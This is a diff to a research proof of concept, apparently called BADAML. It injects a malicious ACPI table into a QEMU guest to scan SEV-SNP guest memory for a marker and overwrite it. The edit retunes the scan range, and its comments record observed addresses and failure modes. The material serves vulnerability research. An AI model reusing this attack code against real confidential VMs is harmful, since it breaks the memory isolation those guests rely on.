@@ -12,9 +12,9 @@
     To mount the attack, we use a shell wrapper around QEMU that adds the malicious table via -acpitable flag.
 
     The AML code does the following:
-    - Scans ~4GB of guest physical memory from 0x100000 (1MB, skipping legacy area) in
-      8MB steps (510 iterations), looking for the 0xDEADBEEF pattern. Since the target
-      file is 16MB, an 8MB step guarantees a hit.
+    - Scans guest physical memory from 0x40000000 (1GB) in 8MB steps,
+      looking for the 0xDEADBEEF pattern. Since the target file is 16MB,
+      an 8MB step guarantees a hit.
     - Once found, scans backward to find the start of the pattern block.
     - Overwrites the first 4 bytes with 0xCAFEBABE.
 */
@@ -107,16 +107,27 @@ DefinitionBlock ("", "SSDT", 6, "BADAML", "BADAML", 0x20240306)
             {
                 Debug = "BADAML: _INI started"
 
-                // Scan base: 0x100000 (1MB) to skip legacy BIOS area.
-                Local0 = 0x100000
+                // Scan base: 0x40000000 (1GB). The initrd is loaded by OVMF
+                // toward the upper end of guest RAM (empirically observed
+                // around 0x8B000000 on our 2.4GB test VMs), so starting at
+                // 1GB rather skips ~128 iterations that we know never contain
+                // the target. Starting the scan further also mitigates against
+                // unhandled #VC exit code 0x404 on SEV-SNP that were observed
+                // to cause intermittent guest terminations.
+                Local0 = 0x40000000
 
                 Debug = "BADAML: coarse scanning memory for 0xdeadbeef"
 
-                // Coarse scan: 510 steps of 8MB (0x800000) = ~4GB of memory.
-                // All values stay within 32 bits (max address ~0xFF100000).
-                // The deadbeef file is 16MB, so an 8MB step guarantees a hit.
+                // Coarse scan: 170 steps of 8MB (0x800000) = ~1.33GB total.
+                // Last scanned address is 0x40000000 + 169*0x800000 = 0x94800000,
+                // which stays inside the primary usable-RAM block of our 2.4GB
+                // VMs (it ends around 0x968eefff per e820). Reading past usable
+                // RAM hits the ioremap path on SEV-SNP, which would corrupt the
+                // private memory mapping - so we stop short of RAM end.
+                // The deadbeef file is 16MB; we observe it loaded around
+                // 0x8B000000, so this scan range still covers the hit.
                 // Note: bytes DE AD BE EF read as little-endian DWORD = 0xEFBEADDE.
-                Local2 = CSCA(Local0, 510, 0x800000, 0xEFBEADDE)
+                Local2 = CSCA(Local0, 170, 0x800000, 0xEFBEADDE)
 
                 If (Local2 != Zero)
                 {
